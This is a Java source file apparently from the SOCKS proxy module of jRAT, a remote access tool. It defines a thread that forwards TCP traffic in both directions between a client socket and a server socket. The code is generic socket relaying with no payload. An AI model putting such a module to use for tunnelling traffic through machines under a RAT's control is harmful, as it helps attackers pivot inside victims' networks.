package jrat.module.socks;

import jrat.common.Logger;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;


public class ClientThread extends Thread { 
	
    private Socket mClientSocket; 
    private Socket mServerSocket; 
    private boolean mForwardingActive = false; 
 
    public ClientThread(Socket aClientSocket, Socket forward) { 
        mClientSocket = aClientSocket; 
        mServerSocket = forward;
    } 
 
    /** 
     * Establishes connection to the destination server and 
     * starts bidirectional forwarding ot data between the 
     * client and the server. 
     */ 
    public void run() { 
        InputStream clientIn; 
        OutputStream clientOut; 
        InputStream serverIn; 
        OutputStream serverOut; 
        try { 
            // Connect to the destination server
            // Turn on keep-alive for both the sockets 
            mServerSocket.setKeepAlive(true); 
            mClientSocket.setKeepAlive(true); 
 
            // Obtain client & server input & output streams 
            clientIn = mClientSocket.getInputStream(); 
            clientOut = mClientSocket.getOutputStream(); 
            serverIn = mServerSocket.getInputStream(); 
            serverOut = mServerSocket.getOutputStream(); 
        } catch (IOException ioe) { 
            System.err.println("Can not connect to");
            connectionBroken(); 
            return; 
        } 
 
        // Start forwarding data between server and client 
        mForwardingActive = true; 
        ForwardThread clientForward = new ForwardThread(this, clientIn, serverOut);
        clientForward.start(); 
        ForwardThread serverForward = new ForwardThread(this, serverIn, clientOut);
        serverForward.start();

        Logger.log(mClientSocket.getInetAddress().getHostAddress() + "-> " + mServerSocket.getInetAddress().getHostAddress() + " started");
    } 
 
    /** 
     * Called by some of the forwarding threads to indicate 
     * that its socket connection is brokean and both client 
     * and server sockets should be closed. Closing the client 
     * and server sockets causes all threads blocked on reading 
     * or writing to these sockets to get an exception and to 
     * finish their execution. 
     */ 
    public synchronized void connectionBroken() { 
        try { 
            mServerSocket.close(); 
        } catch (Exception e) {

        }
        try { 
            mClientSocket.close();
        }
        catch (Exception e) {

        }
 
        if (mForwardingActive) { 
            Logger.warn(mClientSocket.getInetAddress().getHostAddress() + "-> " + mServerSocket.getInetAddress().getHostAddress() + " stopped");
            mForwardingActive = false; 
        } 
    }

    /**
     * ForwardThread handles the TCP forwarding between a socket
     * input stream (source) and a socket output stream (dest).
     * It reads the input stream and forwards everything to the
     * output stream. If some of the streams fails, the forwarding
     * stops and the parent is notified to close all its sockets.
     */
    private static class ForwardThread extends Thread {

        private static final int BUFFER_SIZE = 8192;

        InputStream mInputStream;
        OutputStream mOutputStream;
        ClientThread mParent;

        /**
         * Creates a new traffic redirection thread specifying
         * its parent, input stream and output stream.
         */
        public ForwardThread(ClientThread aParent, InputStream
                aInputStream, OutputStream aOutputStream) {
            mParent = aParent;
            mInputStream = aInputStream;
            mOutputStream = aOutputStream;
        }

        /**
         * Runs the thread. Continuously reads the input stream and
         * writes the read data to the output stream. If reading or
         * writing fail, exits the thread and notifies the parent
         * about the failure.
         */
        public void run() {
            byte[] buffer = new byte[BUFFER_SIZE];
            try {
                while (true) {
                    int bytesRead = mInputStream.read(buffer);
                    if (bytesRead == -1)
                        break; // End of stream is reached --> exit
                    mOutputStream.write(buffer, 0, bytesRead);
                    mOutputStream.flush();
                }
            } catch (IOException e) {

            }

            mParent.connectionBroken();
        }
    }

} 
 
